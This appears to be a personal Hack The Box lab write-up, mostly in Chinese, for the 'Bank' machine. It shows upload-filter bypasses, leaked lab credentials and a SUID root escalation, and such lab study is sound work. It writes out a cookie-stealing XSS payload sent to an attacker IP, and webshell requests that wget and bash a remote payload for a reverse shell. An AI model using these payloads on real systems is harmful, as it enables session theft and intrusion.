# Bank
- URL : https://app.hackthebox.eu/machines/26
- IP : 10.129.29.200

## Recon
- Rustscan
    - ![](https://i.imgur.com/ui0FgmM.png)
- Nmap
    - ![](https://i.imgur.com/Y6kACGg.png)
- 通靈加 Host
    - ![](https://i.imgur.com/iC631Jn.png)
- 加 `/etc/hosts`
- 加 Host 載下來看
    - ![](https://i.imgur.com/DhyF6x6.png)
    - ![](https://i.imgur.com/aOo4atT.png)
    - 發現 302 轉走，但其實是有資料ㄉ
- 掃目錄
    - ![](https://i.imgur.com/WqJPTBb.png)
    - http://bank.htb/assets/
    - ![](https://i.imgur.com/c9TaYlY.png)
    - ![](https://i.imgur.com/fEJpUyV.png)
## 嘗試傳 Webshell
- `support.php`
    - ![](https://i.imgur.com/r1tRnO1.png)
    - ![](https://i.imgur.com/iLxm8GZ.png)
    - 看起來可以傳檔案
    - ![](https://i.imgur.com/lcHhl04.png)
        - 但只能傳圖片
- 嘗試用各種方法繞
    - ![](https://i.imgur.com/GxeRaCs.png)
    - ![](https://i.imgur.com/UgrEjAo.png)
    - ![](https://i.imgur.com/olvLN1G.png)
    - 但基本上都失敗
## 取得密碼
- 通靈掃到 `/balance-transfer`
    - ![](https://i.imgur.com/K3uPCGE.png)
    - ![](https://i.imgur.com/ost4Ysx.png)
- 發現裡面的資訊都有過加密
    - ![](https://i.imgur.com/ci7houA.png)
- 複製出來觀察 size
```python
a = a.replace("[ ]	","")
a = a.split("\n")
l = []
for i in a:
    i = i.split(" 	")
    l.append(int(i[1]))
l.sort()
print(l)
```
- 發現有一個檔案大小只有257
    - ![](https://i.imgur.com/0ULnHZx.png)
    - ![](https://i.imgur.com/5hXHTeB.png)
- 觀察檔案內容
    - ![](https://i.imgur.com/f2WgmUU.png)
    - 取得帳密
        - `chris@bank.htb`
        - `!##HTBB4nkP4ssw0rd!##`
- 順利登入
    - ![](https://i.imgur.com/qBwubSL.png)
- 又回到 `support.php`
    - ![](https://i.imgur.com/vCvpvvA.png)
- 測各種副檔名繞過
    - ![](https://i.imgur.com/rVUJA4g.png)
    - `s.php%00.jpg`
    - `s.php\x00.jpg`
    - 都失敗
- 測 XSS
    - `<script>new Image().src="http://10.10.16.35:1234/"+document.cookie</script>`
    - ![](https://i.imgur.com/9IC6lyA.png)
    - 成功
- 檢查註解
    - ![](https://i.imgur.com/vbvc1Al.png)
    - 發現可以用 `.htb`
    - ![](https://i.imgur.com/OVhx9q9.png)
    - ![](https://i.imgur.com/afIjbXp.png)
- 成功上傳 Webshell
    - ![](https://i.imgur.com/PRCVt4b.png)
## 執行 Reverse shell 
- `bank.htb/uploads/s.htb?A=wget 10.10.16.35:8000/s_HTB`
- `http://bank.htb/uploads/s.htb?A=bash%20s_HTB`
- ![](https://i.imgur.com/CgDYY32.png)
- spawn
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
## 提權
- Kernel Version
    - ![](https://i.imgur.com/pSMl7YV.png)
- 有奇怪的 SUID 程式
    - ![](https://i.imgur.com/CyjdJ1n.png)
- 直接執行
    - ![](https://i.imgur.com/GBxNHv0.png)
    - 就 Root shell ㄌ
- 取得 Flag
    - Root
        - ![](https://i.imgur.com/gjxhnw5.png)
    - User
        - ![](https://i.imgur.com/oknOIgq.png)
## 嘗試不登入傳 shell 
- 先隨便傳
    - ![](https://i.imgur.com/r4Ga6HL.png)
- Burp 改副檔名 `.htb`
    - ![](https://i.imgur.com/lHtWkqM.png)
- 上傳成功
    - ![](https://i.imgur.com/udGq3Oz.png)
    - 所以取得密碼的那一段根本不用做就可以結束ㄌ= =

## 學到了
- php 副檔名方法
- 注意註解 QQ

